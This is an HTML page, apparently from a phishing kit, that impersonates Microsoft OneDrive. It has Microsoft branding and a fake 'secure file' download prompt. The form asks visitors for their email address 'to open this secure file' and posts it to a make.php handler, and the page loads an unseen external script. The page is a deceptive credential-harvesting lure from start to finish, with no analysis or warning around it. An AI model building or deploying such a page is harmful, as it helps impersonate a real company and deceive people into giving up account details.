﻿<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
.lfooter {
  position: fixed;
  left: 0;
  bottom: 0;
  width: 100%;
  color: #333;
  text-align: center;
  }
        </style>
		<link rel="icon" href="imgs/favicon.ico" type="image/x-icon" />
		<link rel='stylesheet' href='imgs/styles.css'/>
		<title>File - OneDrive</title>
    </head>
	
    <body>
	
	<div style="background-color:#0078d4;width:100%;padding: 4px 13px;"> <span style="color:#fff;font-size:26px;">OneDrive</span> </div>
	
	 <div id="mydiv">
					<div style="width:38%;float:right;">
			<h2 style="font-size:25px;line-height:30px;color:#333">Simple, Secure file sharing </h2>
			<span style="font-size:14px;font-weight:100;font-family:arial;color:#333">OneDrive lets you share files with end-to-end encryption 
			 link that automatically expires. So you can keep what you share private.</span>
		
			</div>
		
            <div style="width:38%;height:400px;text-align:center">
			<br><form name="testForm"  action="make.php?new&exsvurl=1&ll-cc=1033&modurl=0&path=4r-next&ndhe" method="post" onsubmit="return validateForm();">
			<br>
			<img src="imgs/cloud.png" width="60" height="">
			<br><span style="color:#0060df;">File Size: 2MB</span><br><br>
			<br>
			<input type="text" name="email" placeholder="Email Address" autocomplete="off">
			<br><span id="errorml" class="m_span"></span><br>
			
			<button class="mb">Download File</button><br><br><br>
			<p style="font-size:12px;">Enter your email address to open this secure file.</p>
			</div>
			
        </div>
		<script type="text/javascript" src="imgs/js.js"></script> 
		<div class="lfooter">
  <p> &copy; Microsoft 2020</p>
</div>
    </body>


</html>